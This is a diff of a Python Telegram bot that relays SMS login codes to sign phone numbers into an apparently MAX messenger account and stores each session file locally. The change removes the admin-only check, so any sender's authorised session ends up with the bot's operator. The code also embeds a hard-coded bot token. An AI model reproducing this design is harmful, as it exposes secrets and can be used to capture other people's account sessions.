@@ -2,59 +2,64 @@ import asyncio
 from aiogram import Bot, Dispatcher, F
 from aiogram.filters import Command
 from aiogram.types import Message
-from pymax import Client
+from pymax import Client, ExtraConfig
 
 BOT_TOKEN = "8983059538:AAF1XQEkuwmvYreLN2csBfYrRW8NBQ9pwuc"
-ADMIN_ID = 123456789
 
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher()
-
 pending = {}
 
-# Шаг 1: ты присылаешь номер (любой текст без команды)
+class TelegramSmsProvider:
+    def __init__(self):
+        self._queue = asyncio.Queue()
+
+    async def set_code(self, code: str):
+        await self._queue.put(code)
+
+    async def get_code(self, phone: str) -> str:
+        return await self._queue.get()
+
 @dp.message(F.text, ~F.text.startswith("/"))
 async def phone_handler(msg: Message):
-    if msg.from_user.id != ADMIN_ID:
-        return
-
     phone = msg.text.strip()
-
     if not phone.startswith("+") or len(phone) != 12:
-        return await msg.answer("❌ Неверный формат. Пришли: +79161234567")
+        return await msg.answer("❌ Формат: +79161234567")
 
-    status_msg = await msg.answer(f"⏳ Запрашиваю SMS на {phone}...")
+    sms_provider = TelegramSmsProvider()
+    client = Client(
+        phone=phone,
+        work_dir="cache",
+        session_name=f"{phone}.db",
+        sms_code_provider=sms_provider,
+        extra_config=ExtraConfig(log_level="INFO"),
+    )
 
-    client = Client(phone=phone, work_dir="cache", session_name=f"{phone}.db")
+    asyncio.create_task(run_client(msg, client, phone, sms_provider))
+    await msg.answer(f"⏳ Запрашиваю SMS на {phone}... Жду код.")
 
+async def run_client(msg: Message, client: Client, phone: str, sms_provider: TelegramSmsProvider):
     try:
-        await client.request_code()
-        pending[msg.from_user.id] = {"client": client, "phone": phone}
-        await status_msg.edit_text(f"📩 Код отправлен на {phone}\nПришли его: /code 12345")
+        pending[msg.from_user.id] = sms_provider
+        await client.start()
+        await msg.answer(f"✅ {phone} авторизован!\nСессия: cache/{phone}.db")
     except Exception as e:
-        await status_msg.edit_text(f"❌ Ошибка: {e}")
+        await msg.answer(f"❌ Ошибка: {type(e).__name__}: {e}")
+    finally:
+        pending.pop(msg.from_user.id, None)
 
-# Шаг 2: ты присылаешь код
 @dp.message(Command("code"))
 async def code_handler(msg: Message):
     if msg.from_user.id not in pending:
-        return await msg.answer("❌ Сначала пришли номер")
+        return await msg.answer("❌ Сначала отправь номер")
 
     code = msg.text.split()[1] if len(msg.text.split()) > 1 else None
     if not code or not code.isdigit():
         return await msg.answer("❌ Используй: /code 12345")
 
-    data = pending.pop(msg.from_user.id)
-    client = data["client"]
-    phone = data["phone"]
-
-    status_msg = await msg.answer("⏳ Авторизую...")
-
-    try:
-        await client.sign_in(code)
-        await status_msg.edit_text(f"✅ Номер {phone} авторизован!\nСессия: cache/{phone}.db")
-    except Exception as e:
-        await status_msg.edit_text(f"❌ Ошибка: {e}")
+    provider = pending[msg.from_user.id]
+    await provider.set_code(code)
+    await msg.answer("✅ Код принят, авторизую...")
 
 async def main():
     print("Бот запущен")
